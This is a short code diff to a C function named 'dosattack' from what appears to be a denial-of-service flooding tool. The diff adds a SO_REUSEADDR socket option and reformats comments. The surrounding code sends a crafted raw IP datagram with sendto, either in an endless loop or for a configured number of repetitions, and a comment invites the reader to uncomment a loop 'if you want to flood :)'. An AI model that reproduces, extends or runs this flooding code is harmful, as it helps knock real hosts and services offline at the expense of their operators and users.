@@ -145,6 +145,14 @@ void dosattack(const struct AHTTP_INPUT *ainput)
         exit(0);
     }
 
+    int flag = 1;
+    int len = sizeof(int);
+    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
+    {
+        debug(debug_mode, 2, "Error setting SO_REUSEADDR. Error number: %d - Error message: %s", errno, strerror(errno));
+        exit(0);
+    }
+
     // Uncommend the loop if you want to flood :)
     //while (1)
     //{
@@ -154,7 +162,7 @@ void dosattack(const struct AHTTP_INPUT *ainput)
         for (;;)
         {
             if (sendto(
-                    socket_fd,                       // our socket
+                    socket_fd,               // our socket
                     datagram,                // the buffer containing headers and data
                     iph->tot_len,            // total length of our datagram
                     0,                       // routing flags, normally always 0
@@ -178,7 +186,7 @@ void dosattack(const struct AHTTP_INPUT *ainput)
         for (l = 0; l < ptmp->MaxLoop; ++l)
         {
             if (sendto(
-                    socket_fd,                       // our socket
+                    socket_fd,               // our socket
                     datagram,                // the buffer containing headers and data
                     iph->tot_len,            // total length of our datagram
                     0,                       // routing flags, normally always 0
